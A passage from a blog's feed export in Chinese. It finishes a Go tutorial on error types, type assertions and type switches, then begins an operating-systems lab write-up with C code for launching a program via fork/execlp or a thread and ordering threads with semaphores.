errorString <span class="keyword">struct</span> &#123; text <span class="type">string</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *errorString)</span></span> Error() <span class="type">string</span> &#123; <span class="keyword">return</span> e.text &#125;</span><br></pre></td></tr></table></figure><p>承载errorString的类型是一个结构体而非一个字符串，这是为了保护它表示的错误。我们也不想要重要的error例如 io.EOF和一个刚好有相同错误消息的error比较后相等。</p><p>调用errors.New函数是非常稀少的，因为有一个方便的封装函数fmt.Errorf，它还会处理字符串格式化。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;errors&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Errorf</span><span class="params">(format <span class="type">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> errors.New(Sprintf(format, args...))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类型断言"><a class="markdownIt-Anchor" href="#类型断言"></a> 类型断言</h2><p>类型断言是一个使用在接口值上的操作。语法是 <code>x.(T)</code>，其中 <code>x</code> 是接口类型，<code>T</code> 是要检查的目标类型。如果 <code>x</code> 的实际类型与 <code>T</code> 匹配，断言成功，返回 <code>x</code> 的值，类型为 <code>T</code>；如果不匹配，程序会抛出 <code>panic</code>。简而言之，类型断言用于确保接口的值可以安全地转换为某种具体类型。如果断言操作的对象是一个nil接口值，那么不论被断言的类型是什么这个类型断言都会失败。</p><p>第二个结果通常赋值给一个命名为ok的变量。如果这个操作失败了，那么ok就是false值，第一个结果等于被断言类型的零值。这个ok结果经常立即用于决定程序下面做什么。if语句的扩展格式让这个变的很简洁：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> f, ok := w.(*os.File); ok &#123;</span><br><span class="line">    <span class="comment">// ...use f...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于类型断言区别错误类型"><a class="markdownIt-Anchor" href="#基于类型断言区别错误类型"></a> 基于类型断言区别错误类型</h3><p>有了类型断言这个强力的工具，我们就可以轻松的判断错误类型。</p><p>对于给定的三个错误原因：文件已经存在（对于创建操作），找不到文件（对于读取操作），和权限拒绝。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> os</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsExist</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">bool</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsNotExist</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">bool</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsPermission</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">bool</span></span><br></pre></td></tr></table></figure><p>对这些判断的一个缺乏经验的实现可能会去检查错误消息是否包含了特定的子字符串：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsNotExist</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> not robust!</span></span><br><span class="line">    <span class="keyword">return</span> strings.Contains(err.Error(), <span class="string">&quot;file does not exist&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是处理I/O的逻辑在不同的平台上并不一定一样，所以这种方案缺乏健壮性。一个更可靠的方式是使用一个专门的类型来描述结构化的错误。实际上os标准库里也是这么实现的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> os</span><br><span class="line"><span class="comment">// PathError records an error and the operation and file path that caused it.</span></span><br><span class="line"><span class="keyword">type</span> PathError <span class="keyword">struct</span> &#123;</span><br><span class="line">    Op <span class="type">string</span></span><br><span class="line">    Path <span class="type">string</span></span><br><span class="line">    Err <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *PathError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> e.Op + <span class="string">&quot; &quot;</span> + e.Path + <span class="string">&quot;: &quot;</span> + e.Err.Error()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面展示的IsNotExist，它会报出是否一个错误和 syscall.ENOENT或者和os.ErrNotExist相等，用于判断文件或目录是否不存在。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> ErrNotExist = errors.New(<span class="string">&quot;file does not exist&quot;</span>)</span><br><span class="line"><span class="comment">// IsNotExist returns a boolean indicating whether the error is known to</span></span><br><span class="line"><span class="comment">// report that a file or directory does not exist. It is satisfied by</span></span><br><span class="line"><span class="comment">// ErrNotExist as well as some syscall errors.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsNotExist</span><span class="params">(err <span class="type">error</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> pe, ok := err.(*PathError); ok &#123;</span><br><span class="line">    err = pe.Err <span class="comment">//提取内部的真实错误原因</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err == syscall.ENOENT || err == ErrNotExist</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际调用如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">_, err := os.Open(<span class="string">&quot;/no/such/file&quot;</span>)</span><br><span class="line">fmt.Println(os.IsNotExist(err)) <span class="comment">// &quot;true&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>Q：为什么不直接比较 err 是否等于 syscall.ENOENT 或 ErrNotExist？</p><p>A：在 Go 中，错误经常被“包装”起来。例如，<code>PathError</code> 就是一种错误包装，它不仅包含了底层的系统错误，还附带了文件路径和操作类型的信息。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&amp;os.PathError&#123;</span><br><span class="line">    Op:   <span class="string">&quot;open&quot;</span>,</span><br><span class="line">    Path: <span class="string">&quot;/invalid/path&quot;</span>,</span><br><span class="line">    Err:  syscall.ENOENT,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，err 是 *PathError，而不是 syscall.ENOENT。直接比较 err == syscall.ENOENT 是不会成功的，因为 err 包装了更多的上下文信息，而不是简单的 syscall.ENOENT。<br />通过类型断言，IsNotExist 函数可以提取 PathError 内部的真正错误 (pe.Err)，然后再比较底层的错误。这就是为什么需要先检查 err 是否是 *PathError 类型，并提取内部的 Err 进行判断的原因。</p></blockquote><h3 id="基于类型断言询问行为"><a class="markdownIt-Anchor" href="#基于类型断言询问行为"></a> 基于类型断言询问行为</h3><p>有了类型断言，我们可以判断传入的变量是否满足特定类型的要求，从而实施不同的操作。</p><p>假设一个情形：我们需要向web服务器写入HTTP头字段。io.Writer接口类型的变量w代表HTTP响应；写入它的字节最终被发送到某个人的web浏览器上。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeHeader</span><span class="params">(w io.Writer, contentType <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> _, err := w.Write([]<span class="type">byte</span>(<span class="string">&quot;Content-Type: &quot;</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, err := w.Write([]<span class="type">byte</span>(contentType)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为Write方法需要传入一个byte切片而我们希望写入的值是一个字符串，所以我们需要使用<code>[]byte(...)</code>进行转换。这个转换会消耗额外的性能，并且会使得服务器的速度变慢。能否优化掉这个类型转换呢？</p><p>如果我们回顾net/http包中的内幕，我们知道在这个程序中的w变量持有的动态类型也有一个允许字符串高效写入的<code>WriteString</code>方法；这个方法会避免去分配一个临时的拷贝。所以我们可以直接调用<code>WriteString</code>方法来优化掉原先的方法。</p><p>但是这里存在一个问题，我们不能对任意io.Writer类型的变量w，假设它也拥有<code>WriteString</code>方法。但是我们可以定义一个只有这个方法的新接口并且使用类型断言来检测是否w的动态类型满足这个新接口。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// writeString writes s to w.</span></span><br><span class="line"><span class="comment">// If w has a WriteString method, it is invoked instead of w.Write.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeString</span><span class="params">(w io.Writer, s <span class="type">string</span>)</span></span> (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">type</span> stringWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">    WriteString(<span class="type">string</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sw, ok := w.(stringWriter); ok &#123;</span><br><span class="line">    <span class="keyword">return</span> sw.WriteString(s) <span class="comment">// avoid a copy</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> w.Write([]<span class="type">byte</span>(s)) <span class="comment">// allocate temporary copy</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeHeader</span><span class="params">(w io.Writer, contentType <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> _, err := writeString(w, <span class="string">&quot;Content-Type: &quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, err := writeString(w, contentType); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的writeString函数使用一个类型断言来获知一个普遍接口类型的值是否满足一个更加具体的接口类型；并且如果满足，它会使用这个更具体接口的行为。这个技术可以被很好的使用，不论这个被询问的接口是一个标准如io.ReadWriter，或者用户定义的如stringWriter接口。</p><h3 id="类型分支"><a class="markdownIt-Anchor" href="#类型分支"></a> 类型分支</h3><p>基于断言区别error类型也好，质询行为也罢，本质上都是通过类型断言的结果来执行不同的操作。在类型分支这一小节，本质是不变的，我们来看看如果类型断言的分支较多时如何处理。假设我们使用Go语言查询一个SQL数据库，Go调用的API会干净地将查询中固定的部分和变化的部分分开。一个调用的例子可能看起来像这样：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listTracks</span><span class="params">(db sql.DB, artist <span class="type">string</span>, minYear, maxYear <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    result, err := db.Exec(</span><br><span class="line">    <span class="string">&quot;SELECT * FROM tracks WHERE artist = ? AND ? &lt;= year AND year &lt;= ?&quot;</span>,</span><br><span class="line">    artist, minYear, maxYear)</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exec方法使用SQL字面量替换在查询字符串中的每个’?'；SQL字面量表示相应参数的值，它有可能是一个布尔值，一个数字，一个字符串，或者nil空值。用这种方式构造查询可以帮助避免SQL注入攻击。在Exec函数内部可能会找到像下面这样的一个函数，它会将每一个参数值转换成它的SQL字面量符号：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqlQuote</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NULL&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> _, ok := x.(<span class="type">int</span>); ok &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, x)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> _, ok := x.(<span class="type">uint</span>); ok &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, x)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> b, ok := x.(<span class="type">bool</span>); ok &#123;</span><br><span class="line">        <span class="keyword">if</span> b &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;FALSE&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> s, ok := x.(<span class="type">string</span>); ok &#123;</span><br><span class="line">    <span class="keyword">return</span> sqlQuoteString(s) <span class="comment">// (not shown)</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;unexpected type %T: %v&quot;</span>, x, x))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>switch语句可以简化if-else链，如果这个if-else链对一连串值做相等测试。一个相似的type switch（类型分支）可以简化类型断言的if-else链。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> x.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>: <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>, <span class="type">uint</span>: <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> <span class="type">bool</span>: <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>: <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个类型分支像普通的switch语句一样，它的运算对象是x.(type)——它使用了关键词字面量type——并且每个case有一到多个类型。一个类型分支基于这个接口值的动态类型使一个多路分支有效。和普通switch语句一样，每一个case会被顺序的进行考虑，并且当一个匹配找到时，这个case中的内容会被执行。当一个或多个case类型是接口时，case的顺序就会变得很重要，因为可能会有两个case同时匹配的情况。</p><p>使用类型分支的扩展形式来重写sqlQuote函数会让这个函数更加的清晰：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqlQuote</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> x := x.(<span class="keyword">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NULL&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">int</span>, <span class="type">uint</span>:</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, x) <span class="comment">// x has type interface&#123;&#125; here.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> x &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;FALSE&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">    <span class="keyword">return</span> sqlQuoteString(x) <span class="comment">// (not shown)</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;unexpected type %T: %v&quot;</span>, x, x))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管sqlQuote接受一个任意类型的参数，但是这个函数只会在它的参数匹配类型分支中的一个case时运行到结束；其它情况的它会panic出“unexpected type”消息。虽然x的类型是interface{}，但是我们把它认为是一个int，uint，bool，string，和nil值的discriminated union（可识别联合）</p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h2><p>一般来说，接口被以两种不同的方式使用。</p><p>第一种方式是<span class='p red'>以方法为核心的接口</span>。典型例子是<code>io.Reader</code>、<code>io.Writer</code>、<code>fmt.Stringer</code>、<code>sort.Interface</code>、<code>http.Handler</code> 和 <code>error</code>。在这种方式下，<strong>接口的方法</strong>定义了多个实现该接口的具体类型之间的相似性。<strong>重点</strong>在于接口所定义的方法，而不是具体的实现类型。实现该接口的类型只要实现了接口规定的方法即可，具体的类型细节是隐藏的。例如，<code>io.Writer</code> 接口定义了一个写入功能，不管它是写入文件、网络、内存还是其他地方，只要它实现了 <code>Write</code> 方法，它就可以被当作 <code>io.Writer</code> 使用。</p><p>第二种方式是<span class='p red'>以类型为核心的接口</span>。在这种方式下，接口的作用类似于一个可以持有不同具体类型的“容器”。<strong>重点</strong>在于具体的类型，而不是接口的方法本身。接口值可以持有各种不同的具体类型，程序员可以使用<strong>类型断言</strong>或类型判断，来区别接口持有的不同类型，并对每个类型执行不同的操作。不像第一种方式，类型的细节并没有被隐藏，接口只是起到了一种“包裹”不同类型的作用。这种方式类似于“联合类型”或“可辨识联合”，编译器或程序可以根据实际类型的不同做出不同的处理。</p><p>在设计新包时，Go的新手程序员往往会先定义一套接口，然后再去实现一些具体类型来满足这些接口。这种做法的结果是产生了许多接口，而每个接口可能只有一个实现。这其实是多余的抽象，同时也带来了运行时的性能开销。你可以通过导出的机制来控制类型的方法或结构体字段是否在包外可见。接口只有在需要让两个或更多具体类型以相同方式处理时才有必要引入。</p><p>当然，也有一个例外。如果一个具体类型由于依赖关系无法与接口在同一个包中实现，这时引入接口有助于解耦两个包，避免相互依赖。</p><p>在Go中，接口设计的一个核心原则就是简化：接口应该足够小，仅包含所需的方法。更小的接口意味着更少的方法，像 <code>io.Writer</code> 或 <code>fmt.Stringer</code> 这样的接口通常只包含一个方法。这样的设计不仅使得接口更容易被新的类型实现，也符合“只要你需要的东西”这一设计哲学。</p><p>至此，我们对Go的方法和接口进行了总结。虽然Go对面向对象编程提供了良好的支持，但这并不意味着你必须一切都用面向对象风格来解决。并非所有事物都需要当作对象来处理。独立的函数、未封装的数据结构在许多场景中同样有用。你可以回顾一下前几章的例子，像 <code>input.Scan</code> 这样的方法使用的次数不到二十次，而像 <code>fmt.Printf</code> 这样的函数被频繁调用，展示了函数和非对象化设计在Go中的仍然占有一席之地。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2FAA1B2C149C8C4BFF45431A929E653C.jpg" alt="2FAA1B2C149C8C4BFF45431A929E653C" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS Lab</title>
      <link href="/posts/30b9345756ad/"/>
      <url>/posts/30b9345756ad/</url>
      
        <content type="html"><![CDATA[<span class='p center logo large'>OS Lab</span><span class='p center small'>Archive of operating system experiments</span><p>此博客用于归纳操作系统实验中的代码，充当说明文档。着重于讲解代码调试过程与原理，附带一些参考资料。</p><p>你可以在这里找到我的所有实验代码 ----&gt; <a href="https://github.com/Adam8en/OS-experiment-archive">Adam8en/OS-experiment-archive: Code of my operating system experiment course. (github.com)</a></p><p>需要注意的是，本代码是基于WSL平台开发测试的，如果你是在Windows操作系统上编写代码，将无法复现本博客的实验并将代码编译成可执行文件。</p><p>最后，祝阅读愉快。</p><h2 id="lab01"><a class="markdownIt-Anchor" href="#lab01"></a> Lab01</h2><p>进程和线程是现代操作系统中最重要的概念，通过多线程程序设计，操作系统能够充分利用计算机系统中的各种硬件资源，极大的提高系统效率。本实验主要考查对多线程概念的理论，以及利用C/C++语言编程实现多线程程序，学会创建进程，掌握信号量的使用，以实现多线程的同步。</p><h3 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h3><blockquote><p>编写程序，在程序中根据用户输入的可执行程序名称，创建一个进程来运行该可执行程序。</p></blockquote><p>在linux系统中，可以通过<span class="bubble-content">fork()</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">fork函数将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。这两个进程中的线程继续执行，就像是两个用户同时启动了该应用程序的两个副本。 </span></span>函数创建一个新的进程，并且返回子进程的pid。我们可以先获取要执行的程序名，然后在子进程中用<span class="bubble-content">execlp()</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">一旦执行完execlp函数，立刻会去执行新的程序。新的程序会替换当前程序、代码段、数据段、堆、栈。经常与多进程组合使用，用一个子进程单独执行execlp程序 </span></span>函数执行程序，父进程只需等待子进程结束即可。</p><p>可以通过pid来辨别父进程和子进程。由于子进程pid为0，所以可以很方便的构造出一个if-else语句根据当前运行进程的pid来判断该执行子进程操作还是父进程操作。</p><p>以下是第一问的源代码：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> programeName[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    getcwd(path,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">strcat</span>(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the name of executable file\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,programeName);</span><br><span class="line">    <span class="built_in">strcat</span>(path,programeName);</span><br><span class="line">    <span class="comment">//获取程序名并且和路径拼接</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//fork failed</span></span><br><span class="line">        perror(<span class="string">&quot;fork failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//子进程执行操作</span></span><br><span class="line">        execlp(path,programeName,(<span class="type">char</span>*)<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// execlp函数执行成功后将不会返回，若返回说明执行失败，所以需要exit(1)</span></span><br><span class="line">        perror(<span class="string">&quot;execlp failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程执行操作</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;over.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>话说回来，这道题最开始做的时候我还看错了，以为是要用<strong>线程</strong>而非<strong>进程</strong>实现这个操作，所以还搓了一个线程版本。</p><p>用线程实现的话，就不宜继续用<code>execlp()</code>函数了。使用线程的方式调用 <code>execlp()</code>，这通常不太常见，因为线程替换映像可能会导致复杂性。一般来说，调用外部程序通常是在独立的进程中进行。所以可以通过<strong>线程执行一个外部程序</strong>的方式来模拟<code>fork()</code> 的效果，即使用 <code>system()</code> 调用外部程序，而不是用 <code>execlp()</code>，这样不会替换进程映像。</p><p>之后，主线程使用 <code>pthread_join()</code> 来等待子线程执行完毕。</p><p>源代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> programeName[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">myFunc</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    <span class="comment">// 使用 system() 来执行外部程序，保持主线程的控制权</span></span><br><span class="line">    <span class="type">int</span> ret = system(path);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;system() failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> myThread;</span><br><span class="line"></span><br><span class="line">    getcwd(path,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">strcat</span>(path, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the name of executable file\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,programeName);</span><br><span class="line">    <span class="built_in">strcat</span>(path,programeName);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;myThread, <span class="literal">NULL</span>, myFunc, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create thread&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pthread_join(myThread,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>              </div>            </details><p>运行结果如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241010230224284.png" alt="image-20241010230224284" /></p><h3 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h3><blockquote><p>假设有四个线程，第一个线程输出字符串 “This”，第二个线程输出字符串 “is”, 第三个线程输出字符串“Jinan”, 第四个线程输出字符串 “University！”。编制C/C++程序，在主程序main函数中创建四个线程并依次启动，设计信号量(Semaphore)同步机制，当主程序运行时，屏幕输出的结果是字符串“This is Jinan University!”</p></blockquote><p>要实现这个功能，可以使用四个信号量，分别控制每个线程的执行顺序。每个线程在输出其字符串之前需要等待对应的信号量信号，然后输出字符串并释放下一个线程的信号量。在创建线程后，我们可以在主函数中先启动第一个线程，然后依次通过信号量控制后续线程的执行。</p><p>源代码如下：</p><details class="folding-tag" cyan><summary> 查看完整代码 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_arr[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_1</span><span class="params">(<span class="type">void</span>*)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This &quot;</span>);</span><br><span class="line">    sem_post(&amp;sem_arr[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">Func_2</span><span 